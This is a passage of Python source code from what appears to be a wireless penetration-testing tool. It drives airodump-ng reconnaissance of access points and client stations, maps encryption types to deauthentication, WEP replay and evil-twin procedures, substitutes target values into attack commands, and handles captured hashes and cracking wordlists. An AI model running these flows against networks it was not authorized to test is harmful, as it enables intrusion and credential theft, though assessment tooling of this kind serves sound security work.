   │ │ │ │     x                    │    │
   │ │ │ │     x                    ▾    │
   │ │ │ └───►(•)                  (•)   │
   │ │ └─────► │ wlan1              │A0  │
   │ └───────► ┌─────┐        ┌─────┐    │
   │           │ D1  │        │ D0  │    │
   │          /───────\      /───────\   │
   │                                     │
   └─────────────────────────────────────┘""",

    ("WPA-PERSONAL", "1"): r"""
   ┌─────────────────────────────────────┐       ┌─────────────────────────────────────┐
   │   AP                                │       │   AP                                │
   │   (•) ◂────────────────────────┐    │       │   (•)                               │
   │    ┴                           │    │       │    ┴                                │
   │                                │    │       │                                     │
   │                                │    │       │                                     │
   │                                │    │       │                                     │
   │                                ▾    │       │                                     │
   │         ((•))                 (•)   │       │         ((•))◂───────────────►(•)   │
   │           │ 1 wlan1 rogue      │A0  │       │           │ 1 wlan1 rogue      │A0  │
   │           ┌─────┐        ┌─────┐    │       │           ┌─────┐        ┌─────┐    │
   │           │ D1  │        │ D0  │    │       │           │ D1  │        │ D0  │    │
   │          /───────\      /───────\   │       │          /───────\      /───────\   │
   │                                     │       │                                     │
   └─────────────────────────────────────┘       └─────────────────────────────────────┘""",

    ("WPA3", "1"): r"""
   ┌─────────────────────────────────────┐       ┌─────────────────────────────────────┐
   │   AP                                │       │   AP                                │
   │   (•) ◂────────────────────────┐    │       │   (•)                               │
   │    ┴                           │    │       │    ┴                                │
   │                                │    │       │                                     │
   │                                │    │       │                                     │
   │                                │    │       │                                     │
   │                                ▾    │       │                                     │
   │         ((•))                 (•)   │       │         ((•))◂───────────────►(•)   │
   │           │ 1 wlan1 rogue      │A0  │       │           │ 1 wlan1 rogue      │A0  │
   │           ┌─────┐        ┌─────┐    │       │           ┌─────┐        ┌─────┐    │
   │           │ D1  │        │ D0  │    │       │           │ D1  │        │ D0  │    │
   │          /───────\      /───────\   │       │          /───────\      /───────\   │
   │                                     │       │                                     │
   └─────────────────────────────────────┘       └─────────────────────────────────────┘""",

    ("WPA-ENTERPRISE", "1"): r"""
   ┌─────────────────────────────────────┐       ┌─────────────────────────────────────┐
   │   AP                                │       │   AP                                │
   │   (•) ◂────────────────────────┐    │       │   (•)                               │
   │    ┴                           │    │       │    ┴                                │
   │                                │    │       │                                     │
   │                                │    │       │                                     │
   │                                │    │       │                                     │
   │                                ▾    │       │                                     │
   │         ((•))                 (•)   │       │         ((•))◂───────────────►(•)   │
   │           │ 1 wlan1 rogue      │A0  │       │           │ 1 wlan1 rogue      │A0  │
   │           ┌─────┐        ┌─────┐    │       │           ┌─────┐        ┌─────┐    │
   │           │ D1  │        │ D0  │    │       │           │ D1  │        │ D0  │    │
   │          /───────\      /───────\   │       │          /───────\      /───────\   │
   │                                     │       │                                     │
   └─────────────────────────────────────┘       └─────────────────────────────────────┘""",

}

_CONSOLE_PANEL_MAP = {
    "OPEN": {
        "CAPTURE":   "CAPTURE",
        "MAC":       "MAC",
        "DEAUTH":    "DEAUTH",
        "PING":      "CONFIRM",     # step 4 is "Confirm" in manual vocabulary
    },
    "WEP": {
        "CAPTURE":   "CAPTURE",
        "FAKEAUTH":  "FAKEAUTH",
        "ARPREPLAY": "ARPREPLAY",
        "DEAUTH":    "DEAUTH",
    },
    "WPA-PERSONAL":   { "EVIL_TWIN": "EVIL_TWIN" },
    "WPA3":           { "EVIL_TWIN": "EVIL_TWIN" },
    "WPA-ENTERPRISE": { "EVIL_TWIN": "EVIL_TWIN" },
}

def _console_step(console_key):
    """Return (label, name, panel, body, cmds, n, total) for the procedure
    step associated with this worker console, based on current target's flow.
    """
    folder, info = load_target()
    if not folder:
        return None
    priv = (info.get("privacy", "") or "").upper()
    auth = (info.get("authentication", "") or "").upper()
    if "OPN" in priv:                    flow = "OPEN"
    elif "WEP" in priv:                  flow = "WEP"
    elif "MGT" in auth or "EAP" in auth: flow = "WPA-ENTERPRISE"
    elif "SAE" in auth:                  flow = "WPA3"
    else:                                flow = "WPA-PERSONAL"
    steps = _PROCEDURE_STEPS.get(flow) or []
    if not steps:
        return None
    needle = _CONSOLE_PANEL_MAP.get(flow, {}).get(console_key.upper(), console_key)
    if not needle:
        return None
    needle_up = needle.upper()
    for i, (label, name, panel, body, cmds) in enumerate(steps):
        if needle_up in (panel or "").upper():
            return (label, name, panel, body, cmds, i + 1, len(steps))
    return None

def _wep_command_values():
    """Real values for `<X>` substitution in worker console COMMANDS."""
    folder, info = load_target()
    vals = {
        "AP":          (info.get("bssid")   if info else None) or "<AP>",
        "CH":          (info.get("channel") if info else None) or "<CH>",
        "MON":         MONITOR(),
        "ADAPTER_MAC": current_mac(MONITOR()) or "<ADAPTER_MAC>",
        "STATION_MAC": "<STATION_MAC>",
    }
    if folder:
        # spoofed target · deauth uses this (STATION from MAC spoof)
        saved = (info.get("station") or "").strip().upper()
        if saved and ":" in saved:
            vals["STATION_MAC"] = saved
        else:
            try:
                stations = load_stations(folder, info.get("bssid", ""))
                if stations:
                    vals["STATION_MAC"] = stations[-1]
            except Exception:
                pass
    return vals

def _subst_cmd(cmd, values):
    for k, v in values.items():
        cmd = cmd.replace(f"<{k}>", str(v))
    return cmd

def _console_banner(console_key):
    """Print only the actionable commands for this console step.
    No header, no step tag, no body prose.  Commands prefixed with
    # print as dim comments; everything else prints as $ command.
    This keeps the console display consistent across all workers:
    just the transparent shell commands the operator should run.
    """
    step = _console_step(console_key)
    if not step:
        return
    label, name, panel, body, cmds, n, total = step
    if not cmds:
        return
    vals = _wep_command_values()
    print()
    print(rule("commands"))
    for c in cmds:
        if c.strip().startswith("#"):
            print(f"       {DIM}{c}{R}")
        else:
            print(f"       {DIM}$ {_subst_cmd(c, vals)}{R}")

def _print_procedure_paged(procedure):
    """Render the procedure (steps + commands + drawings) into a temp
    file and view it with less -R.  Quit with q to return."""
    steps = _PROCEDURE_STEPS.get(procedure)
    if not steps:
        return
    lines = []
    title = _PROCEDURE_TITLES.get(procedure, f"procedure {procedure}")
    lines.append("")
    lines.append(rule(title))
    _BODY_INDENT = 16
    _WRAP_W = 88
    for label, name, panel, body, cmds in steps:
        lines.append(f"       {WHT}[{label}] {name.upper()}{R}")
        for b in body:
            if len(b) <= _WRAP_W:
                lines.append(f"{' ' * _BODY_INDENT}{WHT}{b}{R}")
            else:
                for wl in textwrap.wrap(
                        b, width=_WRAP_W,
                        break_long_words=False, break_on_hyphens=False):
                    lines.append(f"{' ' * _BODY_INDENT}{WHT}{wl}{R}")
        if cmds:
            lines.append("")
            for c in cmds:
                lines.append(f"                {DIM}$ {c}{R}")
        art = _PROCEDURE_DRAWINGS.get((procedure, label))
        if art:
            lines.append("")
            for line in art.strip("\n").split("\n"):
                lines.append(f"       {WHT}{line}{R}")
        lines.append("")
    lines.append("")
    lines.append(f"       {WHT}(press q to return to options){R}")
    lines.append("")

    fd, tmp = tempfile.mkstemp(prefix="wsa_proc_", suffix=".txt")
    with os.fdopen(fd, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    restore()
    clear()  # ensure cursor at home — less paints from row 1
    try:
        subprocess.run(["less", "-R", "-X", tmp])
    except KeyboardInterrupt:
        pass
    try:
        os.unlink(tmp)
    except OSError:
        pass
    # patch8: do not clear -- keep scrollback so context survives less

def _print_procedure_compact(procedure):
    """Render procedure steps for the main pane in multi-line format:
           [N] NAME
               description
               outcome
               $ command
    All flows use this format as of v3.0.4 vocabulary update.
    """
    steps = _PROCEDURE_STEPS.get(procedure)
    if not steps:
        return
    print(rule("procedure steps"))
    for label, name, panel, body, cmds in steps:
        print()
        print(f"       {WHT}[{label}] {name.upper()}{R}")
        for line in body:
            print(f"           {WHT}{line}{R}")
        if cmds:
            for c in cmds:
                if c.strip().startswith("#"):
                    print(f"           {DIM}{c}{R}")
                else:
                    print(f"           {DIM}$ {c}{R}")
    print()

def _station_scan_for_bssid(bssid, channel, iface, duration):
    """Lock airodump-ng on bssid+channel for `duration` seconds and
    return the set of unique station MACs associated to that BSSID."""
    tag = bssid.replace(":", "")
    tmp = f"/tmp/wsa_locked_{tag}"
    for f in glob.glob(f"{tmp}-*"):
        try: os.unlink(f)
        except Exception: pass

    try:
        proc = subprocess.Popen(
            ["sudo", "airodump-ng", "--bssid", bssid,
             "-c", str(channel),
             "--output-format", "csv",
             "-w", tmp, iface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL)
    except Exception:
        return 0

    time.sleep(duration)
    try:
        proc.send_signal(signal.SIGINT)
        proc.wait(timeout=5)
    except Exception:
        try: proc.kill()
        except Exception: pass

    csv_file = f"{tmp}-01.csv"
    if not os.path.exists(csv_file):
        return 0

    stations = set()
    in_station = False
    try:
        with open(csv_file, errors="ignore") as f:
            for line in f:
                row = line.split(",")
                if not row:
                    continue
                if "Station MAC" in row[0]:
                    in_station = True
                    continue
                if in_station and len(row) >= 6:
                    mac   = row[0].strip().upper()
                    assoc = row[5].strip().upper()
                    if (assoc == bssid.upper() and mac
                            and not mac.startswith("FF:")
                            and mac != bssid.upper()):
                        stations.add(mac)
    except Exception:
        pass
    return stations

def _detect_controller(aps):
    """Mark each AP with ap['ctrl'] = True when its ESSID is broadcast
    from more than one BSSID, or spans both 2.4 and 5 GHz bands.
    patch_stations"""
    from collections import defaultdict
    by_essid = defaultdict(list)
    for ap in aps:
        by_essid[ap.get("essid", "")].append(ap)

    for essid, members in by_essid.items():
        channels, bssids = set(), set()
        for ap in members:
            bssids.add(ap.get("bssid", ""))
            ch_raw = (ap.get("channel", "") or "").split()[0]
            try:
                channels.add(int(ch_raw))
            except ValueError:
                pass
        multi_bssid = len(bssids) > 1
        bands_24 = {c for c in channels if c <= 14}
        bands_5  = {c for c in channels if c  > 14}
        cross_band = bool(bands_24 and bands_5)
        is_ctrl = multi_bssid or cross_band
        for ap in members:
            ap["ctrl"] = is_ctrl
            ap["ctrl_reason"] = (
                "multi-bssid" if multi_bssid and not cross_band else
                "cross-band"  if cross_band and not multi_bssid else
                "both"        if multi_bssid and cross_band else ""
            )

def _enrich_aps_with_stations(aps):
    """Attach ap['stations'] = count of unique clients, and
    ap['_station_macs'] = sorted list of those MACs.

    Primary source: stations parsed from the recon CSV (already
    captured, no rescan needed).  Secondary: a short live rescan
    per-BSSID — only for APs the recon pass saw nothing on (clients
    that slept through recon but woke up).  Own adapter MACs are
    excluded throughout.
    """
    if not aps:
        return

    own      = _own_mac_set()
    iface    = MONITOR()
    duration = int(THR("station_scan_duration"))
    total    = len(aps)

    def _recon_set(ap):
        return {m for m in (ap.get("recon_stations") or set())
                if m not in own}

    def _recon_only():
        for ap in aps:
            rs = _recon_set(ap)
            ap["stations"]      = len(rs)
            ap["_station_macs"] = sorted(rs)

    need_scan = sum(1 for ap in aps if not _recon_set(ap))

    if need_scan > 5:
        restore(); clear()
        standard_header()
        print()
        print(rule("reconnaissance"))
        print(f"       {WHT}analysing {total} access points  ·  "
              f"{need_scan} need live scan  ·  {duration}s each{R}")
        mins, secs = divmod(need_scan * duration, 60)
        print(f"       {WHT}estimated time: {mins}m {secs:02d}s{R}")
        print()
        print(f"       {DIM}Ctrl+C skips the rest and uses recon data only.{R}")
        print()
        sys.stdout.flush()
        try:
            ans = input(f"   {LBL}continue? [Y/n]:{R} ").strip().lower()
        except (KeyboardInterrupt, EOFError):
            _recon_only()
            _detect_controller(aps)
            return
        if ans and ans not in ("y", "yes"):
            _recon_only()
            _detect_controller(aps)
            return

    aborted = False
    for i, ap in enumerate(aps, 1):
        recon_set = _recon_set(ap)
        if recon_set:
            ap["stations"]      = len(recon_set)
            ap["_station_macs"] = sorted(recon_set)
            continue

        restore(); clear()
        standard_header()
        print()
        print(rule("reconnaissance"))
        print(f"       {WHT}live-scanning {i}/{total}   "
              f"{ap['bssid']}   ch {ap['channel']}{R}")
        print(f"       {WHT}essid: {ap['essid']}{R}")
        print()
        sys.stdout.flush()
        try:
            live_set = _station_scan_for_bssid(
                ap["bssid"], ap["channel"], iface, duration)
        except KeyboardInterrupt:
            aborted = True
            live_set = set()
            ap["stations"]      = 0
            ap["_station_macs"] = []
            break

        live_set = {m for m in live_set if m not in own}
        merged   = recon_set | live_set
        ap["stations"]      = len(merged)
        ap["_station_macs"] = sorted(merged)

    if aborted:
        for ap in aps:
            if "stations" not in ap:
                rs = _recon_set(ap)
                ap["stations"]      = len(rs)
                ap["_station_macs"] = sorted(rs)

    _detect_controller(aps)

def _controller_drilldown(aps, essid):
    """Show all BSSIDs for a controller ESSID. Return chosen AP, or None.
    patch_controller"""
    members = [ap for ap in aps if ap.get("essid") == essid]
    if not members:
        return None

    while True:
        restore(); clear()
        standard_header()
        print()
        print(rule("controller environment"))
        print(f"       {WHT}essid: {essid}{R}")
        print(f"       {WHT}bssids: {len(members)}   "
              f"total stations: {sum(m.get('stations', 0) for m in members)}{R}")
        print()
        print(f"       {WHT}"
              f"{'#':<4}  "
              f"{'CH':>4}  "
              f"{'BAND':<5}  "
              f"{'PWR':>5}  "
              f"{'BSSID':<20}  "
              f"{'STA':>4}{R}")
        for i, ap in enumerate(members, 1):
            try:
                ch = int(str(ap.get("channel", "0")).split()[0])
                band = "2.4" if ch <= 14 else "5.0"
            except ValueError:
                ch, band = 0, "?"
            print(f"       {WHT}"
                  f"{i:<4}  "
                  f"{ch:>4}  "
                  f"{band:<5}  "
                  f"{ap['power']:>5}  "
                  f"{ap['bssid']:<20}  "
                  f"{ap.get('stations', 0):>4}{R}")
        print()
        print(f"       {WHT}all  coordinated multi-channel capture "
              f"(needs two monitor radios){R}")
        print(f"       {WHT}0    back to target list{R}")
        print()
        sys.stdout.flush()

        try:
            choice = input(f"   {LBL}SELECT OPTION ▸{R} ").strip().lower()
        except (KeyboardInterrupt, EOFError):
            return None

        if choice == "0" or choice == "":
            return None
        if choice == "all":
            print()
            print(f"       {VAL}coordinated capture needs two monitor radios.{R}")
            print(f"       {WHT}select a single BSSID for now.{R}")
            print()
            time.sleep(1.8)
            continue
        if choice.isdigit():
            n = int(choice)
            if 1 <= n <= len(members):
                return members[n - 1]
        # invalid -> loop

def run_target_select(csv_file, auto_mode=False):
    aps = _read_scan_csv(csv_file)
    if not aps:
        clear(); print()
        print(f"  {ERR}ERROR:{R} no access points in scan")
        print()
        input(f"   {LBL}press ENTER to return ▸{R} ")
        return (False, None, None, None, None)

    # P1-3: refine PMF using beacon RSN caps from the recon pcap
    _cap = csv_file.replace("-01.csv", "-01.cap")
    if os.path.exists(_cap):
        _enrich_pmf_from_cap(aps, _cap)

    _enrich_aps_with_stations(aps)

    restore(); clear()
    standard_header()
    print()
    print(rule("targets"))
    print(f"       {WHT}"
          f"{'#':<4}  {'PWR':>5}  {'CH':>4}  {'BSSID':<18}  "
          f"{'ENC / CIPHER':<20}  {'AUTH':<10}  {'PMF':<5}  "
          f"{'STA':>4}  {'CTRL':<6}  ESSID{R}")
    for i, ap in enumerate(aps, 1):
        enc = ap["privacy"]
        if ap["cipher"] and ap["cipher"] != "0":
            enc += " " + ap["cipher"]
        auth = ap["auth"] or "-"
        pmf  = ap.get("pmf", "-")
        sta  = ap.get("stations", 0)
        ctrl = "yes" if ap.get("ctrl") else ""
        print(f"       {WHT}"
              f"{i:<4}  {ap['power']:>5}  {ap['channel']:>4}  "
              f"{ap['bssid']:<18}  {enc:<20}  {auth:<10}  "
              f"{pmf:<5}  {sta:>4}  {ctrl:<6}  {ap['essid']}{R}")
    print()
    if any(ap.get("ctrl") for ap in aps):
        print(f"       {DIM}CTRL = ESSID broadcast from multiple BSSIDs "
              f"or across bands (controller environment).{R}")
        print()
    sys.stdout.flush()

    while True:
        try:
            choice = input(f"   {LBL}SELECT OPTION [0 to go back]:{R} ").strip()
        except (KeyboardInterrupt, EOFError):
            return (False, None, None, None, None)
        if choice == "0":
            return (False, None, None, None, None)
        if not choice.isdigit():
            continue
        n = int(choice)
        if 1 <= n <= len(aps):
            candidate = aps[n - 1]
            if candidate.get("ctrl"):
                picked = _controller_drilldown(aps, candidate["essid"])
                if picked is None:
                    continue
                target = picked
            else:
                target = candidate
            break

    # warn when target shows 0 clients — client-required flows will abort
    if target.get("stations", 0) == 0:
        print()
        print(f"       {VAL}⚠  target shows 0 clients connected{R}")
        print(f"       {DIM}flows requiring a client will abort after their cycle cap{R}")
        print(f"       {DIM}proceed anyway? [Y/n] {R}", end="")
        sys.stdout.flush()
        try:
            _a = input().strip().lower()
        except (KeyboardInterrupt, EOFError):
            return (False, None, None, None, None)
        if _a and _a not in ("y", "yes"):
            return (False, None, None, None, None)

    base   = "hidden" if target["hidden"] else _safe_folder_name(target["essid"])
    base   = _pick_folder(base)
    folder = os.path.join(ASSESSMENTS_DIR, base)
    if not _ensure_user_dir(folder):
        clear(); print()
        print(f"  {ERR}ERROR:{R} cannot create folder {folder}")
        print(f"       {WHT}check permissions on {ASSESSMENTS_DIR}{R}")
        print(f"       {WHT}fix:  sudo chown -R $USER:$USER {ASSESSMENTS_DIR}{R}")
        print()
        input(f"   {LBL}press ENTER to return \u25b8{R} ")
        return (False, None, None, None, None)

    with open(os.path.join(folder, "target_info.txt"), "w") as f:
        f.write(f"ESSID:             {target['essid']}\n")
        f.write(f"ESSID_STATUS:      "
                f"{'hidden' if target['hidden'] else 'known'}\n")
        f.write(f"BSSID:             {target['bssid']}\n")
        f.write(f"Channel:           {target['channel']}\n")
        f.write(f"Privacy:           {target['privacy']}\n")
        f.write(f"Cipher:            {target['cipher']}\n")
        f.write(f"Authentication:    {target['auth']}\n")
        f.write(f"PMF:               {target.get('pmf', '-')}\n")
        f.write(f"Adapter:           {MONITOR()}\n")

    with open(CURRENT_FILE, "w") as f:
        f.write(folder)

    procedure = _classify_target(target["privacy"], target["auth"])

    _tmux("select-pane", "-t", f"{SESSION}:0.0", "-T", "CAPTURE PROCEDURE")
    _apply_tmux_theme(force=True)

    _draw_main_screen(procedure)
    panes = _deploy_flow_panes(procedure) or {}

    target_dict = {
        "folder":  folder, "essid":   target["essid"],
        "bssid":   target["bssid"], "channel": target["channel"],
        "privacy": target["privacy"], "cipher":  target["cipher"],
        "auth":    target["auth"], "flow":    procedure,
        "pmf":     target.get("pmf", "-"),
    }

    if auto_mode:
        return (True, procedure, "auto", target_dict, panes)

    # master content was drawn before deploy at full width; skip the
    # first redraw so it stays visible without a second flash
    if not panes:
        action = _main_console_loop(procedure)
    else:
        action = _main_console_loop(procedure, skip_first_draw=True)
    return (True, procedure, action, target_dict, panes)

def _draw_main_screen(procedure):
    """Draw one clean main-pane cycle: target + procedure + options.

    All output — clear sequence and content — is captured into a
    buffer and written in a single sys.stdout.write() so the terminal
    paints it as one operation.  Eliminates the blank frame between
    the target list and the procedure view.
    """
    import io
    subprocess.run("stty sane", shell=True,
                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    _real = sys.stdout
    _cap  = io.StringIO()
    sys.stdout = _cap
    sys.stdout.write("\033[?25h\033[0m")
    clear()
    standard_header()
    _, info = load_target()
    if info:
        print(rule("target"))
        print(row("essid",   info.get("essid", "-")))
        print(row("bssid",   info.get("bssid", "-")))
        print(row("channel", info.get("channel", "-")))
        print(row("privacy", info.get("privacy", "-")))
        print(row("auth",    info.get("authentication", "-") or "-"))
        folder, _ = load_target()
        if folder:
            print(row("folder", folder))
        print()

    _print_procedure_compact(procedure)

    print(rule("options"))
    print(f"       {WHT}1  confirm capture{R}")
    print(f"       {WHT}2  back to scan{R}")
    print(f"       {WHT}3  exit{R}")
    print(f"       {DIM}d  view full procedure (steps, commands, diagrams){R}")
    print()
    sys.stdout = _real
    sys.stdout.write(_cap.getvalue())
    sys.stdout.flush()

def _main_console_loop(procedure, skip_first_draw=False):
    if not skip_first_draw:
        _draw_main_screen(procedure)
    while True:
        try:
            choice = input(f"   {LBL}SELECT OPTION ▸{R} ").strip()
        except (KeyboardInterrupt, EOFError):
            return "exit"

        if choice == "1":
            return "confirm"
        if choice == "2":
            print()
            try:
                _c = input(f"   {LBL}kill worker panes and return to scan? [y/N]:{R} ").strip().lower()
            except (KeyboardInterrupt, EOFError):
                _c = ""
            if _c in ("y", "yes"):
                return "scan"
            print(f"   {DIM}cancelled — flow continues{R}")
            print()
            time.sleep(0.8)
            clear()
            _draw_main_screen(procedure)
            continue
        if choice == "3":
            return "exit"
        if choice.lower() == "d":
            _print_procedure_paged(procedure)
            clear()
            _draw_main_screen(procedure)
            continue

        # invalid input: redraw clean rather than accumulate
        clear()
        _draw_main_screen(procedure)

CREDENTIAL_GLOBS = [
    "credentials.txt", "mana_hashes.txt", "key.txt",
    "hashes_jtr.txt", "hashes_hc5500.txt",
    "*.hc22000", "*.hc22000.recovered",
    "REPORT_*.txt", "authorization.txt",
]

def _tighten_credential_perms(folder):
    """chmod 0600 + chown to invoking user on sensitive files.

    Files produced by sudo-run tools (airodump-ng, hostapd-mana) are
    root-owned by default; without chown, they cannot be archived or
    deleted by the operator without sudo.  Both chmod and chown are
    applied here so credential evidence ends up 0600 <user>:<user>.
    """
    try:
        sudo_user = os.environ.get("SUDO_USER")
        if sudo_user and sudo_user != "root":
            pw = pwd.getpwnam(sudo_user)
            uid, gid = pw.pw_uid, pw.pw_gid
        else:
            uid, gid = os.getuid(), os.getgid()
    except Exception:
        uid, gid = os.getuid(), os.getgid()

    for pat in CREDENTIAL_GLOBS:
        for path in glob.glob(os.path.join(folder, pat)):
            try:
                os.chmod(path, 0o600)
            except Exception:
                pass
            try:
                _sudo(["chown", f"{uid}:{gid}", path], timeout=3)
            except Exception:
                pass

def _check_required_tools():
    """F8: verify every external binary the engine relies on is present."""
    REQUIRED_TOOLS = [
        "airodump-ng", "aireplay-ng", "aircrack-ng",
        "hostapd-mana", "hashcat", "iw", "nmcli", "ip", "tmux",
    ]
    missing = [t for t in REQUIRED_TOOLS if not shutil.which(t)]
    if not missing:
        return True
    clear(); print()
    standard_header()
    print(rule("preflight")); print()
    print(f"       {ERR}ERROR:{R} required tools missing")
    print()
    for t in missing:
        print(f"       {WHT}· {t}{R}")
    print()
    print(f"       {WHT}install:{R}")
    print(f"        sudo apt install aircrack-ng hashcat iw network-manager")
    print(f"       {WHT}hostapd-mana is not in apt — build from{R}")
    print(f"        github.com/sensepost/hostapd-mana")
    print()
    input(f"   {LBL}press ENTER to return ▸{R} ")
    return False

def run_capture_session():

    while True:
        csv_file = run_recon()
        if not csv_file:
            return

        ok, procedure, action, target, panes = run_target_select(csv_file, auto_mode=False)
        if not ok:
            continue

        if action == "confirm":
            # Manual-mode wrapup mirrors auto mode — kill processes,
            # generate/finalise report, tighten perms, restore adapters,
            # kill worker panes.  Previously manual mode skipped adapter
            # restore and left wlan1 wedged in monitor/AP mode between
            # runs.
            _folder, _ = load_target()
            
            print(f" {WHT}stopping any lingering processes{R}")
            _kill_adapter_processes(MONITOR())
            if AP() != MONITOR():
                _kill_adapter_processes(AP())
            time.sleep(1)
            
            # For OPEN targets, verify ping outcome at confirmation time.
            # The ping console does not prompt — Ctrl+C during a transient
            # failure would record the wrong state.  Ask now, when the
            # operator knows the final outcome.
            _ping_updated = False
            if _folder:
                _info2 = load_target()[1]
                _privacy2 = (_info2.get("privacy", "") or "").upper()
                if "OPN" in _privacy2:
                    _tf2 = os.path.join(_folder, "target_info.txt")
                    _current = "not recorded"
                    if os.path.exists(_tf2):
                        for _line in open(_tf2, errors="ignore"):
                            if _line.lower().startswith("ping_result:"):
                                _current = _line.split(":", 1)[1].strip()
                                break
                    print()
                    print(f" {WHT}ping verification for OPEN target{R}")
                    print(f"   recorded status: {_current}")
                    print(f"   {DIM}did the spoofed MAC eventually reach internet?{R}")
                    try:
                        _ans = input(f"   {LBL}[Y] yes · [N] no · [ENTER] keep current:{R} ").strip().lower()
                    except (KeyboardInterrupt, EOFError):
                        _ans = ""
                    _result = None
                    if _ans in ("y", "yes"):
                        _result = "yes"
                    elif _ans in ("n", "no"):
                        _result = "no"
                    if _result is not None and os.path.exists(_tf2):
                        _lines = open(_tf2, errors="ignore").read().splitlines()
                        _found = False
                        _new_lines = []
                        for _line in _lines:
                            if _line.lower().startswith("ping_result:"):
                                _new_lines.append(f"PING_RESULT:       {_result}")
                                _found = True
                            else:
                                _new_lines.append(_line)
                        if not _found:
                            _new_lines.append(f"PING_RESULT:       {_result}")
                        if not any(l.lower().startswith("ping_mac:") for l in _lines):
                            _new_lines.append(f"PING_MAC:          {current_mac(SPOOF()) or '(unknown)'}")
                        open(_tf2, "w").write("\n".join(_new_lines) + "\n")
                        _ping_updated = True
                        print(f" {RDY}recorded: {_result}{R}")
                    print()
            
            # dedup: only finalise if we did NOT just update ping status
            # (an update means the report content must change)
            already_report = None
            if _folder and not _ping_updated:
                _matches = sorted(glob.glob(os.path.join(_folder, "REPORT_*.txt")))
                if _matches:
                    already_report = _matches[-1]
            
            if already_report:
                print(f"\n {LBL}►{R} Finalising report...")
                print(f" {RDY}✓{R} Report saved: {WHT}{already_report}{R}")
            else:
                print(f"\n {LBL}►{R} Generating report...")
                rpt = generate_report()
                if rpt:
                    print(f" {RDY}✓{R} Report saved: {WHT}{rpt}{R}")
                else:
                    print(f" {VAL}!{R} Report generation failed.")
            
            print(f" {WHT}tightening credential file permissions{R}")
            if _folder:
                _tighten_credential_perms(_folder)
            
            print(f" {WHT}resetting adapters{R}")
            _restore_all_adapters()
            print(f" {RDY}adapters reset{R}")
            
            _kill_worker_panes()
            return
        elif action == "scan":
            _kill_worker_panes()
            continue
        else:
            _kill_worker_panes()
            ui_restore_and_exit()

# ═══════════════════════════════════════════════════════════════════════════
# SECTION 6 · SETTINGS SCREENS
# ═══════════════════════════════════════════════════════════════════════════

def _wl_folder():
    d = CFG.get("wordlists_dir") or DEFAULTS["wordlists_dir"]
    if os.path.isabs(d):
        return d
    return os.path.join(BASE, d)

def _wl_list_files():
    folder = _wl_folder()
    if not os.path.isdir(folder):
        return []
    out = []
    for name in sorted(os.listdir(folder)):
        full = os.path.join(folder, name)
        if not os.path.isfile(full):
            continue
        try:
            size = os.path.getsize(full)
        except Exception:
            size = 0
        out.append((name, size, full))
    return out

def _wl_fmt_size(n):
    for unit, div in (("GB", 1024**3), ("MB", 1024**2), ("KB", 1024)):
        if n >= div:
            return f"{n/div:.1f} {unit}"
    return f"{n} B"

def _wl_screen_wordlist(files, show_run=False):
    restore(); clear()
    standard_header()
    if show_run:
        folder, info = load_target()
        _analysis_target_block(folder, info)
    print(rule("select wordlist"))
    print(f"       {WHT}folder: {_wl_folder()}{R}")
    print()
    if files:
        for i, (name, size, _) in enumerate(files, 1):
            print(f"       {WHT}{i:<3}{name:<40}{_wl_fmt_size(size):>10}{R}")
    else:
        print(f"       {WHT}(no files in folder){R}")
    print()
    print(f"       {WHT}M  manual path{R}")
    print(f"       {WHT}F  change folder{R}")
    print()
    sys.stdout.flush()



def _wl_screen_mask(show_run=False):
    restore(); clear()
    standard_header()
    if show_run:
        folder, info = load_target()
        _analysis_target_block(folder, info)
    print(rule("define mask"))
    print(f"       {WHT}tokens:  ?l lower  ?u upper  ?d digit  ?s special  ?a all{R}")
    print()
    print(f"       {WHT}examples:{R}")
    _ex = [
        ("?d?d?d?d?d?d?d?d",   "24177314",  "8 digits"),
        ("?l?l?l?l?d?d?d?d",   "home2024",  "4 lower + 4 digits"),
        ("?l?l?l?l?l?l?l?l",   "password",  "8 lowercase"),
        ("?u?l?l?l?l?d?d",     "Admin24",   "capital + 4 lower + 2 digits"),
        ("?u?l?l?l?l?l?d?d?s", "Summer24!", "capital + 5 lower + 2 digits + special"),
    ]
    _mw = max(len(m) for m, _, _ in _ex)
    _ow = max(len(o) for _, o, _ in _ex)
    for _m, _o, _d in _ex:
        print(f"         {WHT}{_m:<{_mw}}{R}  {DIM}\u2192{R}  "
              f"{VAL}{_o:<{_ow}}{R}   {DIM}{_d}{R}")
    print()
    cur = CFG.get("default_mask", "")
    if cur:
        print(f"       {WHT}current: {cur}{R}")
        print()
    print()
    sys.stdout.flush()



def _wl_pick_wordlist(show_run=False):
    while True:
        files  = _wl_list_files()
        _wl_screen_wordlist(files, show_run=show_run)
        try:
            choice = input(f"   {LBL}SELECT OPTION [0 to go back]:{R} ").strip()
        except (KeyboardInterrupt, EOFError):
            return

        if not choice or choice == "0":
            return

        if choice.upper() == "F":
            restore(); clear()
            print(); print()
            print(rule("change folder"))
            print(f"       {WHT}current: {_wl_folder()}{R}")
            print()
            try:
                new = input(f"   {LBL}new path \u25b8{R} ").strip()
            except (KeyboardInterrupt, EOFError):
                continue
            if not new:
                continue
            new = os.path.abspath(os.path.expanduser(new))
            if not os.path.isdir(new):
                restore(); clear()
                print(); print()
                print(rule("change folder"))
                print(f"  {ERR}not a directory:{R} {new}")
                print()
                input(f"   {LBL}press ENTER to return \u25b8{R} ")
                continue
            cfg_set("wordlists_dir", value=new)
            continue

        if choice.upper() == "M":
            restore(); clear()
            print(); print()
            print(rule("manual file path"))
            print()
            try:
                new = input(f"   {LBL}file path \u25b8{R} ").strip()
            except (KeyboardInterrupt, EOFError):
                continue
            if not new:
                continue
            new = os.path.abspath(os.path.expanduser(new))
            if not os.path.isfile(new):
                restore(); clear()
                print(); print()
                print(rule("manual file path"))
                print(f"  {ERR}not a file:{R} {new}")
                print()
                input(f"   {LBL}press ENTER to return \u25b8{R} ")
                continue
            cfg_set("wordlists_dir",   value=os.path.dirname(new))
            cfg_set("default_wordlist", value=os.path.basename(new))
            cfg_set("default_mask",     value="")
            return

        if choice.isdigit():
            n = int(choice)
            if 1 <= n <= len(files):
                name, _, full = files[n - 1]
                cfg_set("default_wordlist", value=name)
                cfg_set("default_mask",     value="")
                return



def _wl_pick_mask(show_run=False):
    while True:
        _wl_screen_mask(show_run=show_run)
        try:
            choice = input(f"   {LBL}mask \u25b8{R} ").strip()
        except (KeyboardInterrupt, EOFError):
            return
        if not choice or choice == "0":
            return
        cfg_set("default_mask",     value=choice)
